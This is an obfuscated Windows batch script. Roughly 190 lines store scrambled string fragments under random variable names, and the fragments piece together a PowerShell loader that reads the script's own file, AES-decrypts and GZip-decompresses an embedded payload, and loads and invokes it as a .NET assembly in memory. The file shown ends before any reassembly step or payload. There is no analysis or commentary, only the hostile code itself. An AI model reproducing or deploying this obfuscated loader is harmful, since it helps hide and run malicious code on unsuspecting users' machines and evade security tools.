@echo off
!lswiUaCvvUWZDtqfGQkn! "mOiyeRogAf=rn_v"
!lswiUaCvvUWZDtqfGQkn! "fuOZYjTGgY=, 0,"
!lswiUaCvvUWZDtqfGQkn! "oVTAzPIBce=tion"
!lswiUaCvvUWZDtqfGQkn! "uAUSxyqHCA=, [I"
!lswiUaCvvUWZDtqfGQkn! "PIGxpzjcoM=raph"
!lswiUaCvvUWZDtqfGQkn! "cOIMqUcklI=;exe"
!lswiUaCvvUWZDtqfGQkn! "MLhGprrxvq=;	$L"
!lswiUaCvvUWZDtqfGQkn! "lMZNtiehSW=ar=d"
!lswiUaCvvUWZDtqfGQkn! "RNcLyPaNZC=lit("
!lswiUaCvvUWZDtqfGQkn! "PyaSlbQMOA=(dec"
!lswiUaCvvUWZDtqfGQkn! "wBuAWcTwnT=txeT"
!lswiUaCvvUWZDtqfGQkn! "qfXdsYmQkU=aram"
!lswiUaCvvUWZDtqfGQkn! "MKHSVrbRnj=ar $"
!lswiUaCvvUWZDtqfGQkn! "EhziSVMOBF=n (["
!lswiUaCvvUWZDtqfGQkn! "GNOTOvqFdn=var)"
!lswiUaCvvUWZDtqfGQkn! "vqbYumdKfZ=);	$"
!lswiUaCvvUWZDtqfGQkn! "DZCmPEersw=rofi"
!lswiUaCvvUWZDtqfGQkn! "tXiRBFjNNl=-Obj"
!lswiUaCvvUWZDtqfGQkn! "fDynRlmfrE=ncti"
!lswiUaCvvUWZDtqfGQkn! "CRlnfmFLVj= '')"
!lswiUaCvvUWZDtqfGQkn! "MxEGEZcIFY=func"
!lswiUaCvvUWZDtqfGQkn! "cJupWeErch=();}"
!lswiUaCvvUWZDtqfGQkn! "zgCMWPojbC=esaB"
!lswiUaCvvUWZDtqfGQkn! "kdmoEeFvXV=aylo"
!lswiUaCvvUWZDtqfGQkn! "gKgHWyzsLa=Y+an"
!lswiUaCvvUWZDtqfGQkn! "glrBzgdQsD=V=[S"
!lswiUaCvvUWZDtqfGQkn! "MCJgHawRfZ=::('"
!lswiUaCvvUWZDtqfGQkn! "KRWkGmevqi=trin"
!lswiUaCvvUWZDtqfGQkn! "aiOsDyHOrg=);	$"
!lswiUaCvvUWZDtqfGQkn! "PMuiXLeyVM=e]::"
!lswiUaCvvUWZDtqfGQkn! "ofSTEwvGTs=-1.."
!lswiUaCvvUWZDtqfGQkn! "LNHFavnMfr=ion "
!lswiUaCvvUWZDtqfGQkn! "beEtyAuXjG=ewLi"
!lswiUaCvvUWZDtqfGQkn! "MnJQczATpm=)));"
!lswiUaCvvUWZDtqfGQkn! "HfsXTatmCs=aylo"
!lswiUaCvvUWZDtqfGQkn! "PnImQHdkPc=m.Co"
!lswiUaCvvUWZDtqfGQkn! "HJOFpZsCum=] -j"
!lswiUaCvvUWZDtqfGQkn! "kVBgdBtftQ=tion"
!lswiUaCvvUWZDtqfGQkn! "GLbuCsuzds=ctio"
!lswiUaCvvUWZDtqfGQkn! "CWxpfyVxXO=[Sys"
!lswiUaCvvUWZDtqfGQkn! "BNRJwfkEeT=Invo"
!lswiUaCvvUWZDtqfGQkn! "DQyYzDAWYN=ose("
!lswiUaCvvUWZDtqfGQkn! "cHyUYiAAYQ=-4] "
!lswiUaCvvUWZDtqfGQkn! "rXYKugokNR=FnFA"
!lswiUaCvvUWZDtqfGQkn! "WXKBuMqhgO=on.G"
!lswiUaCvvUWZDtqfGQkn! "jfijdjYzFZ=var."
!lswiUaCvvUWZDtqfGQkn! "fgnRoYOIVe=.Cry"
!lswiUaCvvUWZDtqfGQkn! "jQPDiegpCX=g(3)"
!lswiUaCvvUWZDtqfGQkn! "WWaxsohlsJ=ecur"
!lswiUaCvvUWZDtqfGQkn! "MCRkRzmlCN=	$lR"
!lswiUaCvvUWZDtqfGQkn! "VVUsinjWLW=ecur"
!lswiUaCvvUWZDtqfGQkn! "WNEFVUlXtW=Syst"
!lswiUaCvvUWZDtqfGQkn! "XCZSoFOzKV=owst"
!lswiUaCvvUWZDtqfGQkn! "cchSkcEvlk=es_v"
!lswiUaCvvUWZDtqfGQkn! "JkehbXcVBa=ctio"
!lswiUaCvvUWZDtqfGQkn! "hzdablqdbE=IO.F"
!lswiUaCvvUWZDtqfGQkn! "lUbSCBOYbD=ram2"
!lswiUaCvvUWZDtqfGQkn! "NkKEYPUXfh=togr"
!lswiUaCvvUWZDtqfGQkn! "MYqdhsTIWp=oin "
!lswiUaCvvUWZDtqfGQkn! "TURhtSHfEu=aes_"
!lswiUaCvvUWZDtqfGQkn! "gUfTsnkOBy=UZIw"
!lswiUaCvvUWZDtqfGQkn! "dmFqHbmxXO='[-1"
!lswiUaCvvUWZDtqfGQkn! "orjRYANeRQ=..-1"
!lswiUaCvvUWZDtqfGQkn! "QCJElRLmOQ=NN.S"
!lswiUaCvvUWZDtqfGQkn! "iBVkslUYMD=.ToA"
!lswiUaCvvUWZDtqfGQkn! "sfhzRtzRUo=morF"
!lswiUaCvvUWZDtqfGQkn! "zhnvEowMsR=Syst"
!lswiUaCvvUWZDtqfGQkn! "qZQplBQhUr=FAy."
!lswiUaCvvUWZDtqfGQkn! "wRoyDMpIAu=)([b"
!lswiUaCvvUWZDtqfGQkn! "nocaiHkXFx=('EZ"
!lswiUaCvvUWZDtqfGQkn! "tAfqnbjYNL={	$M"
!lswiUaCvvUWZDtqfGQkn! "fFUqCHtWko=ion "
!lswiUaCvvUWZDtqfGQkn! "RShHawujjR=ryPo"
!lswiUaCvvUWZDtqfGQkn! "DmHthAwmXc=ar;}"
!lswiUaCvvUWZDtqfGQkn! "xtwwdTgKbq=ject"
!lswiUaCvvUWZDtqfGQkn! "nvhSjGHmoV=teDe"
!lswiUaCvvUWZDtqfGQkn! "ELPOuyywnt=O.Me"
!lswiUaCvvUWZDtqfGQkn! "BrxgVYPrdy=ute_"
!lswiUaCvvUWZDtqfGQkn! "LSdFFtjkUL=Copy"
!lswiUaCvvUWZDtqfGQkn! "BzCihskKrb=[-1."
!lswiUaCvvUWZDtqfGQkn! "hVovsmCjbN=ram_"
!lswiUaCvvUWZDtqfGQkn! "rlMDyLlDNk=Subs"
!lswiUaCvvUWZDtqfGQkn! "YymUPlVBAc=n ''"
!lswiUaCvvUWZDtqfGQkn! "aAUAZESfFQ=+jKF"
!lswiUaCvvUWZDtqfGQkn! "OofmBzhRKb=m.IO"
!lswiUaCvvUWZDtqfGQkn! "bfuEvjzmFK=m($M"
!lswiUaCvvUWZDtqfGQkn! "auPXIpvNtp=l2rf"
!lswiUaCvvUWZDtqfGQkn! "hWaYUzmNru=_fun"
!lswiUaCvvUWZDtqfGQkn! "uLaUqCbPUU=decr"
!lswiUaCvvUWZDtqfGQkn! "dENkQexeay= '')"
!lswiUaCvvUWZDtqfGQkn! "kfXLGiHWCb=ZipS"
!lswiUaCvvUWZDtqfGQkn! "kaOadmkHhT=Padd"
!lswiUaCvvUWZDtqfGQkn! "wyCgpvnSLI=ansf"
!lswiUaCvvUWZDtqfGQkn! "MtAvOGJPMj= $pa"
!lswiUaCvvUWZDtqfGQkn! "NYJZOuyuEq=reat"
!lswiUaCvvUWZDtqfGQkn! "qOvfzSyhQG=('da"
!lswiUaCvvUWZDtqfGQkn! "bALENdtLfp={	$a"
!lswiUaCvvUWZDtqfGQkn! "XGvUUwqDgU=var "
!lswiUaCvvUWZDtqfGQkn! "hcIcZwhQkg=y.Pa"
!lswiUaCvvUWZDtqfGQkn! "ICfPrDIrui=g[]]"
!lswiUaCvvUWZDtqfGQkn! "BLjCqBwfgV= -jo"
!lswiUaCvvUWZDtqfGQkn! "yiNauVlYGD=tion"
!lswiUaCvvUWZDtqfGQkn! "ahTrAouUPs=pres"
!lswiUaCvvUWZDtqfGQkn! "nGIAnNtjcN= Sys"
!lswiUaCvvUWZDtqfGQkn! "PvrMQmDSLO=ep b"
!lswiUaCvvUWZDtqfGQkn! "iEytcVvQEu=decr"
!lswiUaCvvUWZDtqfGQkn! "YUTQyHthTs=ess_"
!lswiUaCvvUWZDtqfGQkn! "wUsLSuFfvZ=ypt_"
!lswiUaCvvUWZDtqfGQkn! "UqZNxdEVrp=rray"
!lswiUaCvvUWZDtqfGQkn! "JkEAAHhSOh=Disp"
!lswiUaCvvUWZDtqfGQkn! "zSJaGNiXOa='')("
!lswiUaCvvUWZDtqfGQkn! "szphWrbQwJ==New"
!lswiUaCvvUWZDtqfGQkn! "uOJIyHimnV=es_v"
!lswiUaCvvUWZDtqfGQkn! "NfbquNxKZo=.Ass"
!lswiUaCvvUWZDtqfGQkn! "rjSfOWeJom=rypt"
!lswiUaCvvUWZDtqfGQkn! "avPPQcTgrC=Q);	"
!lswiUaCvvUWZDtqfGQkn! "QfvvwCQvsf=trea"
!lswiUaCvvUWZDtqfGQkn! "gMrjHTayRs=t.UI"
!lswiUaCvvUWZDtqfGQkn! "HDnMEnPFAC=yte["
!lswiUaCvvUWZDtqfGQkn! "kIUbCrUqcS=-1.."
!lswiUaCvvUWZDtqfGQkn! "XFdbnVKKUH=ach "
!lswiUaCvvUWZDtqfGQkn! "eEfIxfqPdg=[-1."
!lswiUaCvvUWZDtqfGQkn! "adRiROzDay=pkKt"
!lswiUaCvvUWZDtqfGQkn! "JDIviSLWTi='%~f0'"
!lswiUaCvvUWZDtqfGQkn! "OjrzGneQfy=decr"
!lswiUaCvvUWZDtqfGQkn! "shbKgpbEMm=yste"
!lswiUaCvvUWZDtqfGQkn! "UdBoPBPpmw=var."
!lswiUaCvvUWZDtqfGQkn! "zayEdsjjIV=XtcW"
!lswiUaCvvUWZDtqfGQkn! "nXjnOvVRXO=_fun"
!lswiUaCvvUWZDtqfGQkn! "pQpldgbonY=.-11"
!lswiUaCvvUWZDtqfGQkn! "ZMsAleboNN=ar=["
!lswiUaCvvUWZDtqfGQkn! "mtZJtnidsK=unct"
!lswiUaCvvUWZDtqfGQkn! "oGImSJZCSS=_fun"
!lswiUaCvvUWZDtqfGQkn! "nyCGRlPXne=func"
!lswiUaCvvUWZDtqfGQkn! "SbLKpbCWpa=.Ent"
!lswiUaCvvUWZDtqfGQkn! "kFAxuyIGxy=nd f"
!lswiUaCvvUWZDtqfGQkn! "VhAPNfLtqx=O.Co"
!lswiUaCvvUWZDtqfGQkn! "aZXFIxNxEe=OVe="
!lswiUaCvvUWZDtqfGQkn! "tWbEYcPuUn=){	$"
!lswiUaCvvUWZDtqfGQkn! "VZJsiQDmYI=s_va"
!lswiUaCvvUWZDtqfGQkn! "vngYdAGgEx=onve"
!lswiUaCvvUWZDtqfGQkn! "vaLcHNllNk=jQ.D"
!lswiUaCvvUWZDtqfGQkn! "ssBGBiTkYz=plit"
!lswiUaCvvUWZDtqfGQkn! "rLDNiIDssJ=lRIH"
!lswiUaCvvUWZDtqfGQkn! "XgJRcHhzOo=zJwv"
!lswiUaCvvUWZDtqfGQkn! "JbkLxdQvGx=Cryp"
!lswiUaCvvUWZDtqfGQkn! "ozfBlOfSXK=ad1_"
!lswiUaCvvUWZDtqfGQkn! "XxIhHlKQBS=::('"
!lswiUaCvvUWZDtqfGQkn! "PUfDfvdnuT=aes_"
!lswiUaCvvUWZDtqfGQkn! "LtdaXXrXkx=exec"
!lswiUaCvvUWZDtqfGQkn! "pHhJkycYGR=aram"
!lswiUaCvvUWZDtqfGQkn! "KjPRzoPwwX=yloa"
!lswiUaCvvUWZDtqfGQkn! "IRFJTmFFZg=$pay"
!lswiUaCvvUWZDtqfGQkn! "wZRORLnbKz=Bloc"
!lswiUaCvvUWZDtqfGQkn! "ZKIGzUKiVe=.Cip"
!lswiUaCvvUWZDtqfGQkn! "QWIUETViot=ct S"
!lswiUaCvvUWZDtqfGQkn! "OIWKJtEekd=gnir"
!lswiUaCvvUWZDtqfGQkn! "AWLbgyWIfj=);	$"
!lswiUaCvvUWZDtqfGQkn! "okzmqySlLN=rn_v"
!lswiUaCvvUWZDtqfGQkn! "tjbcYBIUKJ=reak"
!lswiUaCvvUWZDtqfGQkn! "vWVndtnVEd=k($p"
!lswiUaCvvUWZDtqfGQkn! "bPDUvHpOvi=r.Tr"
!lswiUaCvvUWZDtqfGQkn! "qWapSRDJhB=ss);"
!lswiUaCvvUWZDtqfGQkn! "daphIEpXDb=d2_v"
!lswiUaCvvUWZDtqfGQkn! "lQpbcIErNp=aram"
!lswiUaCvvUWZDtqfGQkn! "zhAZbnnhnp=Disp"
!lswiUaCvvUWZDtqfGQkn! "OmlNceTGLi=.Aes"
!lswiUaCvvUWZDtqfGQkn! "CvIyfigyxW=Secu"
!lswiUaCvvUWZDtqfGQkn! "MdymanlmKK=m;	$"
!lswiUaCvvUWZDtqfGQkn! "SZKoknUQqK=y=Ne"
!lswiUaCvvUWZDtqfGQkn! "CZLMOAwpzm=mpre"
!lswiUaCvvUWZDtqfGQkn! "DzeYYRcqcS=var."
!lswiUaCvvUWZDtqfGQkn! "BYmtRzCsoH=aBmo"
!lswiUaCvvUWZDtqfGQkn! "govSpbhiSq=var="
!lswiUaCvvUWZDtqfGQkn! "boClViCYWZ=func"
!lswiUaCvvUWZDtqfGQkn! "QXzoWrgKer=Lkij"
!lswiUaCvvUWZDtqfGQkn! "SkuljvToIj=unct"
!lswiUaCvvUWZDtqfGQkn! "IXZQvlXPkx=am(,"
!lswiUaCvvUWZDtqfGQkn! "RUjTwDpWdX=func"
!lswiUaCvvUWZDtqfGQkn! "FrKJjgpsMA=nmpB"
!lswiUaCvvUWZDtqfGQkn! "FUddDzgGno= exe"
!lswiUaCvvUWZDtqfGQkn! "yZIIDFYPCW=(,[s"
